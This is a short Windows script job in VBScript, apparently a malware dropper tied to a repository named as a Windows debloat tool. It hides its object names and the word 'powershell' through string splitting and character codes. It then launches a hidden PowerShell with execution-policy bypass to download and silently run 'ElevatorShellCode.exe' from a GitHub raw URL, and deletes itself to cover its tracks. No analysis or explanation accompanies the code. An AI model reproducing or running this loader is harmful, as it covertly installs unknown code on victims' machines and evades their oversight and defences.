<job id="a">
  <script language="VBScript">
    On Error Resume Next
    Dim s,f,t,e,u,p,c,k,i,r
    Set s=CreateObject("W" & "S" & "c" & "r" & "i" & "p" & "t" & "." & "S" & "h" & "e" & "l" & "l")
    Set f=CreateObject("S" & "c" & "r" & "i" & "p" & "t" & "i" & "n" & "g" & "." & "F" & "i" & "l" & "e" & "S" & "y" & "s" & "t" & "e" & "m" & "O" & "b" & "j" & "e" & "c" & "t")
    t=s.ExpandEnvironmentStrings("%TEMP%")
    e=t & "\es.exe"
    u="https://raw.githubusercontent.com/jimmyishere111/WinDebloat11/main/brokers/ElevatorShellCode.exe"

    ' Build powershell string char-by-char
    p=""
    For Each k In Array(112,111,119,101,114,115,104,101,108,108)
      p=p & Chr(k)
    Next

    c="" & p & " -ep bypass -w hidden -c ""$e='" & e & "'; $u='" & u & "'; try{$w=New-Object Net.WebClient;$w.DownloadFile($u,$e); Start-Process $e -WindowStyle Hidden}catch{}"""
    s.Run c,0,False

    r="cmd /c ping 127.0.0.1 -n 4 > nul & del """ & WScript.ScriptFullName & """"
    s.Run r,0,False
  </script>
</job>
